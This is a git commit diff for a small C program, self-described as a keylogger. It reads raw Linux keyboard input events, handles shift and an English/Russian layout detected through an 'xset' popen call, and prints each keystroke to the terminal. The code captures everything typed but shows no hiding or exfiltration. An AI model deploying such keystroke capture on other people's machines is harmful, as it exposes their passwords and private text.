b2f29ff4ef4445f5f55eaf75789f3d05ac1e51b9
Daniil Prohorov <daniilprohorov@gmail.com>
2018-01-09 10:56:46 +0300

    Keylogger en/ru done

---
+++ src/keymap.h
@@ -0,0 +1,6 @@
+#include <wchar.h>
+#ifndef KEYMAP_H_
+#define KEYMAP_H_
+extern char *keymap[58][2];
+extern char *keymap_ru[58][2];
+#endif /*KEYMAP_H_*/
--- src/main.c
+++ src/main.c
@@ -1,72 +1,23 @@
-
+#include "keymap.h"
 #include <stdio.h>
 #include <fcntl.h>
 #include <linux/input.h>
 #include <unistd.h>
 #include <signal.h>
 #include <stdlib.h>
+#include <wctype.h>
+#include <wchar.h> 
+#include <locale.h>
+//extern char keymap[55][2];
 
+int shift = 0;
+int keycode;
+
+void exportOut( int keycode, int shift );
+int lang( );
 void INThandler(){
         exit(0);
 }
-
-char keymap[55] = {
-0,
-0x1b, //Esc
-'1',
-'2',
-'3',
-'4',
-'5',
-'6',
-'7',
-'8',
-'9',
-'0',
-'-',
-'=',
-8, //backspace
-9, //tab
-'q',
-'w',
-'e',
-'r',
-'t',
-'y',
-'u',
-'i',
-'o',
-'p',
-'[',
-']',
-13, //enter
-255, //caps
-'a',
-'s', 
-'d',
-'f',
-'g',
-'h',
-'j',
-'k',
-'l',
-';',
-0x27,
-0,
-254, //shift
-0x5C,
-'z',
-'x',
-'c',
-'v',
-'b',
-'n',
-'m',
-',',
-'.',
-'/',
-254
-};
 
 int main()
 {
@@ -79,8 +30,67 @@ int main()
         while(1)
         {
                 read(device,&ev, sizeof(ev));
-                if(ev.type == 1 && ev.value == 1){
-                        printf("Key: %d State: %i key %c \n",ev.code,ev.value,keymap[ev.code] );
+                if(ev.type == 1 && ev.value >= 1)
+                {
+                keycode = ev.code;
+                    if( keycode == 42 || keycode == 54 )
+                    {
+                        shift = 1;
+                        do  
+                        {
+                            read(device,&ev, sizeof(ev));
+                            keycode = ev.code;
+                            if(ev.type == 1 && ev.value >= 1 ){
+                                exportOut( keycode, shift );
+                            }
+                        } while(    !(( keycode == 42 && ev.value == 0 )||( keycode == 54 && ev.value == 0 )) ); 
+                        shift = 0;
+                    }
+                    else
+                        exportOut( keycode, shift ); 
                 }
         }
+   // return 0;
+}
+void exportOut( int keycode, int shift )
+{
+    if( lang() == '0')
+    {
+        printf("Key: %s \n",keymap[keycode][shift] );
+    }
+    else
+    {
+        printf("Key: %s \n",keymap_ru[keycode][shift] );
+    }
+}
+int lang() {
+    int c;
+    //~ pp - pipe pointer
+    FILE *pp;
+    extern FILE *popen();
+ 
+    if ( !(pp=popen("xset -q | grep LED | awk '{print $10}' | cut -c 5", "r")) )
+        return 10;
+ 
+    while ( (c=fgetc(pp)) != EOF ) {
+        return c;
+        //putc(c, stdout);
+//~ fflush нужна, чтобы не возникало задержки из-за буферизации
+        fflush(pp);
+    }
+    
+    pclose(pp);
+    return 10;
+/*
+FILE *popen_result;
+    char buff;
+    popen_result = popen("xset -q | grep LED | awk '{print $10}' | cut -c 5", "r");
+    if(!popen_result){
+            printf("Can't execute command\n");
+    }
+    while( popen_result!=NULL){
+        return buff;
+    }
+    pclose(popen_result);
+*/
 }
